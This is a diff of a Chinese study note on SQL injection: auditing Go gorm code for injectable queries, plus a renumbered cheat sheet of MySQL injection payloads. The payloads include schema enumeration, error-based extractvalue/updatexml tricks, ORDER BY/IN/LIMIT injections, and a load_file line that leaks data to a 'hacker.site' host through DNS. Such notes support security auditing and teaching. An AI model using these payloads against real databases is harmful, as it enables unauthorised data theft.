@@ -4,13 +4,15 @@
 
 ​	SQL注入主要是Web应用未对用户输入进行合法校验，导致攻击者能在Web应用预先写好的SQL语句中执行额外的SQL语句，造成非授权的任意查询，进行导致数据库信息泄露，有时甚至可以执行系统命令。
 
-### 1.2 gorm框架注入
+## 0x02 SQL注入漏洞场景
 
-#### 1.2.1 简介
+### 2.1 gorm框架注入
+
+#### 2.1.1 简介
 
 ​	为防止SQL注入，gorm框架对大部分场景都进行了预编译处理，由于框架本身的局限，基于gorm的Web应用还是存在大量的SQL注入问题。
 
-#### 1.2.2 审计
+#### 2.1.2 审计
 
 - where查询
 
@@ -113,11 +115,9 @@ cond := "name in (" + req.name1 + req.name2 + ")"
 db.Where(cond)
 ```
 
-## 0x02 SQL注入漏洞利用
+### 2.2 SQL注入语句
 
-### 2.1 数据查询
-
-- 库名
+#### 2.2.1 库名
 
 ```
 select database()
@@ -125,7 +125,7 @@ select database()
 select schema_name from information_schema.schemata limit 0,1
 ```
 
-- 表名
+#### 2.2.2 表名
 
 ```
 # 表数量
@@ -140,7 +140,7 @@ select make_set(3,'-',(select group_concat(table_name) from information_schema.t
 and exists(select * from users)-- - 	
 ```
 
-- 字段名
+#### 2.2.3 字段名
 
 ```
 # 字段数量
@@ -157,7 +157,7 @@ or (flag)
 and exists(select username from users)-- -
 ```
 
-- 数据
+#### 2.2.4 数据
 
 ```
 1' and length(database())=7-- -
@@ -173,9 +173,7 @@ or username  REGEXP "^admin"
 locate('abcd',abc)
 ```
 
-### 2.2 注入语句
-
-#### 2.2.1 where注入
+#### 2.2.5 where注入
 
 ```
 ' or extractvalue(rand(),version()) or '
@@ -189,7 +187,7 @@ locate('abcd',abc)
 1' into @t1,@t2,@t3…n
 ```
 
-#### 2.2.2 update/insert注入
+#### 2.2.6 update/insert注入
 
 ```
 test'\|conv(hex(version()), 16, 10)\|'a'
@@ -199,7 +197,7 @@ load_file(concat('\\\\',version(),'.hacker.site\\txt'))\|'b
 '+sqrt(ascii(user)-100)+'
 ```
 
-#### 2.2.3 Order by注入
+#### 2.2.7 Order by注入
 
 ```
 1' order by n
@@ -213,7 +211,7 @@ order by updatexml(rand(),version(),0)
 order by (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a)
 ```
 
-#### 2.2.4 表名/列名注入
+#### 2.2.8 表名/列名注入
 
 - 表名
 
@@ -233,7 +231,7 @@ updatexml(rand(),version(),0)
 (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a)
 ```
 
-#### 2.2.5 in注入
+#### 2.2.9 in注入
 
 ```
 if(1=1,115,1)
@@ -243,7 +241,7 @@ updatexml(rand(),version(),0)
 (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a)
 ```
 
-#### 2.2.5 limit 注入 
+#### 2.2.10 limit 注入 
 
 ```
 limit 2,1 procedure analyse((extractvalue(rand(),(select 1234567890))),1);—/**/-   # (5.0.0<mysql<5.6.6) 
